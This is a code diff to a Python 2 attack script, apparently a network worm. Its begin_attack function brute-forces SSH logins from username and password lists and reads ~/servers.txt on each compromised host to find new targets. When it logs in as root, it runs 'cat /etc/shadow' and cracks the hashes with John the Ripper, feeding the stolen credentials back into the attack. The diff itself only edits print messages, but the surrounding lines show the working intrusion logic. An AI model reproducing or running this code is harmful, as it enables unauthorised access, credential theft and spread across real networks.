@@ -128,13 +128,9 @@ def begin_attack(client):
         while (userN < user_len) and (not logged_in):
             userCred = USERNAMES[userN]
             passwd = 0
-            # print "USER: %s" % userCred
             while (passwd < passwd_len) and (not logged_in):
                 passCred = PASSWORDS[passwd]
                 try:
-                    print "%s : %s" % (userCred, passCred)
-                    # if initial_comps > 0:
-                    # if not initial_comps:
                     if server.initial:
                         # attempt to login with current creds
                         client.connect(server.host, server.ssh_port, username=userCred, password=passCred)
@@ -153,7 +149,7 @@ def begin_attack(client):
                         log_root = True
 
                 except Exception as e:
-                    print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
+                    # print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
                     passwd += 1
 
             userN += 1
@@ -164,7 +160,6 @@ def begin_attack(client):
             # gets the servers.txt
             stdin, stdout, stderr = client.exec_command("cat ~/servers.txt")
             new_servers = stdout.readlines()
-            # print "%s\n\t%s" % (server.host, new_servers)
             new_servers = map(lambda x: x.strip(), new_servers)
             for s in new_servers:
                 host, port = get_host_port(s)
@@ -187,7 +182,7 @@ def begin_attack(client):
 
             # if we are logged in as root
             if log_root:
-                print "Logged in as ROOT on %s. Grabbing /etc/shadow" % (server.host)
+                print "Grabbing /etc/shadow on %s" % (server.host)
                 stdin, stdout, stderr = client.exec_command("cat /etc/shadow")
                 accts = user_hashes(stdout)
                 user_passes = crack_with_john(accts)
@@ -206,7 +201,7 @@ def begin_attack(client):
             # put current computer back in the queue
             q.put(server)
 
-    print "QUEUE EMPTY..."
+    print "Finished on the Network..."
 
 # shadow_file = file ptr
 def user_hashes(shadow_file):
@@ -256,11 +251,11 @@ def crack_with_john(hashes_lst):
         # add the username to the summary list
         if not (user in USERNAMES):
             USERNAMES.append(user)
-            print "Adding \"%s\" to Username list" % user
+            print "Adding \"%s\" to USERNAME list" % user
         # add the password to the summary list
         if not (passwd in PASSWORDS):
             PASSWORDS.append(passwd)
-            print "Adding \"%s\" to Password list" % passwd
+            print "Adding \"%s\" to PASSWORD list" % passwd
         combos.append((user, passwd))
 
     return combos
